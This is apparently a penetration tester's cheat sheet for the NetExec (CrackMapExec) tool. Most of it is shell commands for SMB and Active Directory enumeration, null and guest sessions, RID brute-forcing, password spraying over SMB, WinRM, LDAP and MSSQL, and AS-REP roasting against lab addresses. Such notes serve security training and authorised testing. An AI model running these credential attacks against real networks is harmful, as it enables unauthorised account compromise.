# CrackMapExec


```shell
# Command Format
netexec [protocol] 10.10.10.1/24

# Export Function
--export $(pwd)/export.txt
```

- SMB Enumeration

```shell
netexec smb 192.168.133.0/24

# Getting all Hosts with SMB Signing Disabled
--gen-relay-list relaylistOutputFilename.txt

# NULL Session
netexec smb 10.129.203.121 -u '' -p ''

# Guest session
netexec smb 10.129.203.121 -u 'guest' -p ''

# Enumerating AD details
--users
--pass-pol
--groups
--rid-brute # IMPORTANT

# Filtering users
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt

# Enumerating shares
--shares -M spider_plus
```

> Passwords may not contain the user's sAMAccountName (user account name) value or entire displayName (full name value). Both checks aren't case-sensitive.

- Password brute force

```shell
# SMB
netexec smb 10.129.203.121 -u users.txt -p password
netexec smb 10.129.203.121 -u user1 user2 user3 -p password
netexec smb 10.129.203.121 -u user1 user2 user3 -p password1 password2

# Winrm
netexec winrm 10.129.203.121 -u users.txt -p password

# LDAP
netexec ldap 10.129.203.121 -u users.txt -p password

# MSSQL
netexec mssql 10.129.203.121 -u user -p password -d $DOMAIN
netexec mssql 10.129.203.121 -u user -p password -d . # Local Windows account
netexec mssql 10.129.203.121 -u user -p password --local-auth # MSSQL Account

# Options
--continue-on-success
--no-bruteforce
--local-auth
```

> In the case of the message STATUS_PASSWORD_MUST_CHANGE, we can change the user's password using Impacket smbpasswd like: smbpasswd -r domain -U user.

- ASREPRoasting

```shell
netexec ldap 10.129.204.177 -u user -p password --asreproast asreproast.out
```